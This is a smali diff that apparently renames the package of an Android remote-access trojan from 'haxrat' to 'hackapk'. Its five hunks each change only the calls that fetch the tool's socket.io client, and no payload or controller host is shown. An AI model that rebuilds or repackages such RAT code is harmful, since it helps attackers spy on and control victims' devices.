@@ -931,11 +931,11 @@
     move-result-object v9
 
     .line 80
-    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/justhack/hackapk/IOSocket;
 
     move-result-object v9
 
-    invoke-virtual {v9}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v9}, Lcom/justhack/hackapk/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v9
 
@@ -1104,11 +1104,11 @@
     if-ne v9, v10, :cond_4
 
     .line 96
-    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/justhack/hackapk/IOSocket;
 
     move-result-object v9
 
-    invoke-virtual {v9}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v9}, Lcom/justhack/hackapk/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v9
 
@@ -1197,11 +1197,11 @@
     if-ne v9, v10, :cond_5
 
     .line 98
-    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/justhack/hackapk/IOSocket;
 
     move-result-object v9
 
-    invoke-virtual {v9}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v9}, Lcom/justhack/hackapk/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v9
 
@@ -1238,11 +1238,11 @@
     if-ne v9, v10, :cond_6
 
     .line 100
-    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/justhack/hackapk/IOSocket;
 
     move-result-object v9
 
-    invoke-virtual {v9}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v9}, Lcom/justhack/hackapk/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v9
 
@@ -1279,11 +1279,11 @@
     if-ne v9, v10, :cond_3
 
     .line 102
-    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/justhack/hackapk/IOSocket;
 
     move-result-object v9
 
-    invoke-virtual {v9}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v9}, Lcom/justhack/hackapk/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v9
 
